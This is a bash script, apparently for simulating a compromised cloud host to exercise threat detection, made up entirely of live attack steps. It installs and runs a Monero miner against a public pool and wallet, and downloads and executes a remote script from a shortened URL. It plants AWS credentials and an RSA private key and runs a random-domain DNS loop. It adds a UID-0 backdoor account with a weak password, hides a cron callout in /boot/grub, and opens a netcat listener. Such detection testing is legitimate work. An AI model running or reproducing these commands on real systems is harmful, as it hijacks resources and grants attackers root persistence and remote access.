#!/bin/bash

# Install xmrig and launch minining.

sudo su
apt update
apt upgrade
apt install git build-essential cmake libuv1-dev libssl-dev libmicrohttpd-dev gcc-7 g++-7
cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7

cd /home/ubuntu/
wget http://www.houseoflinux.com/download/cpu-miner-xmrig-2-4-5/?wpdmdl=249 -O xmrig-2.4.5-xenial-amd64.deb
apt-get update && sudo apt-get install libmicrohttpd-dev libuv1
sudo dpkg -i xmrig-2.4.5-xenial-amd64.deb
xmrig -a cryptonight -o stratum+tcp://pool.supportxmr.com:5555 -u 45hixKDeRqFi5MLZEYTXLtVe9fxW1wjn8MBYxREfhF3ZBfa9VUiBVLSebpEqYXbiWEhLL18gy9mnnEwV24a4qBb9MCKmzDw -p MinerIdentifier:Email -t 8

wget -O XMR-Miner.sh https://git.io/fNpk8 && chmod +x XMR-Miner.sh && ./XMR-Miner.sh

# create fake AWS Keys on the System
mkdir /home/ubuntu/.aws
cat <<- EOF4 > /home/ubuntu/.aws/credentials
[default]
aws_access_key_id = AKIAJYSOCJXDYU3RNQFQ
aws_secret_access_key = WnukQBKjg6dc89221LHnupvvlwh96sIc1WNL7vhv
EOF4
chown ubuntu.ubuntu /home/ubuntu/.aws/credentials
cat <<- EOF5 > /home/ubuntu/ec2-devkey.pem
-----BEGIN RSA PRIVATE KEY-----
MIIFpQIBAAKCAQEAwGmZkKcdaHvRM3q6ldiwuMzNAeeFSutHmpiLt9igK0vfNuKw
JSZVnkeRwVykSJK6B6zNVYxRpBHXCwDs2EkffvIC0lVb6lJ6XywQLE9jwEJItFdg
cnsa62brj+mJL8Lui1AFElNS59gPJ+1YE7lfw6EM2sRABAqm5NMUSTzcqE7VASVc
BeApG2A9zwZrhR+6ezn2H7BElTtpggvdbH6HOCewMIZy5e6xH5FsK4oPOPIa4+H0
h20TS6/lxlB6vbxttlRG/GUAde05c8pmksDNF5JA+MfLXwn7Eam1mnErB8yHUx4A
Jnx0FWujKI+8slDulDk/EM40rz7s58IZiTPqRwIDAQABAoIBAQCDXNUZ2+4I8ld+
RPDz9s+cKz5faXgoEP9+vVzONFgNlywapaNKiaR0fjo1gBEs9veI2+IH4NewIvnk
qkoI08tr+MASZ3JsRMkFBuk3xy+8B8TpUqonHoLcrvht9SvS7su7UvNTco2seWbH
hJPYS3vk7KQBC3EFEVyl5rH32lRvlsssAoJAeRxWZXWcWL5su9V+IKD/cd40QnJj
OASk2VenVymdBFnxY7w6wxCx5dyElazmW2q6X6uHKWVtcZffqQw7mQPJ34/MvKmb
fi/+qFf+IBfuyfj0ZwzrkQa7U0WmHusxEmMraCOWiTpDCcZnPpo7ni96WFntQBOj
g+6hcceRAoGBAOcU5OPkvbtBrVujqw1nFME5Ha9gUmbHOcYunHOQsfC1bp3echQ+
CkMacpMMojjA4sO1XyEABHC8IDGnQHIQUeuHFu0TqmYvJYOCmo2g/Dsq9tyTg4j5
MNz7yJ3ob66wisGZadxLeWluwD4OYTHmkUKU7a/LEXdrb+QALwGyBLRJAoGBANUp
OndBDwovY0bby+gLXb8Koip+d7xSRhk59eHtKJIW9VNcww4ad+8UGQ4ndMfKZdqD
qc0U+aMfWbYnReCzCnGuCiEpyuTQuXNaig0EaxBYY6zcIIG7weRPsLWUdamIgrjH
DfM5L+SawKbV+BZm5/XchF/PGgFHhxkiHr6HzooPAoGBAICfubQ8O3vC1/r9RBYG
vZ+76hEXXWaGGFt+0GjnLpSceMD486jey5mEXCgLzTQn8VEcYKIev1n87TKWNSII
gYDHRfSakKumLIxiIyMYa62HgbdPiNSyWAd5QrbajWfALswKV8leXWtZUTp5iJJd
E5frC85hCwzcyYAwtfmMnF+5AoGBAJK2PLJlyec1tHvJvi9o204pEHJ09w5cBjlI
pk6ov3rFaHbG6s2jNBcOWyxdxcfZK39ZjZ5EqIk4g7OWlkbQlAioQ/qNXENe0bVu
hIPvHY1zeK86FvmT9CCjJLnlg5J7DZYGEzjrjGYoiR6LOKSakV6sN0QGNBzbUUXg
MQ7sRCDLAoGAfoHiNSKh3rzGGXkVUfnUpTffx5rBWMcosQ0k8JMOGJCk+BO3iwHW
QFAvN6RnOcsaH2gXrzCRGh7ZlwHO6JX4Ggjt/UZ9huWn9TOLkgyzvLEn84ci1hig
NDxp6xUB+1ZinCsDX8Jtv9JgxZ42cq8K2ihkXuJrj/X7Pym9zcJEEKs=
-----END RSA PRIVATE KEY-----
EOF5
chown ubuntu.ubuntu /home/ubuntu/ec2-devkey.pem
chmod 400 /home/ubuntu/ec2-devkey.pem

echo "domain callout"

cat <<- "EOF" > dga1.sh
#!/bin/bash
# Create some bogus domain names and perform DNS queries
# Against a host that is not a DNS Server
cp /usr/bin/dig /usr/sbin/evildigger
while [ 1 ]
do
    PART=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 18 | head -n 1)
    /usr/sbin/evildigger @10.0.1.10 www.$PART.com
done
EOF
chmod +x dga1.sh
at -f dga1.sh now &



#Create a backdoor user
useradd -ou 0 -g 0 hacked-user
echo Passw0rd | passwd hacked-user --stdin &>/dev/null

cat <<- EOF2 > /boot/grub/call2mins.sh
#!/bin/bash
# Call Out Every 2 Minutes
(crontab -l ; echo "*/2 * * * *  /bin/hello") | crontab -
EOF2
chmod +x /boot/grub/call2mins.sh
at -f /boot/grub/call2mins.sh now &


echo "A"

cd /tmp
cp /bin/nc /tmp/remotec
echo "/tmp/remotec -k -l 6666" > darkl0rd_user
chmod +x darkl0rd_user
# execute the command at a specific time (now)
at -f darkl0rd_user now &

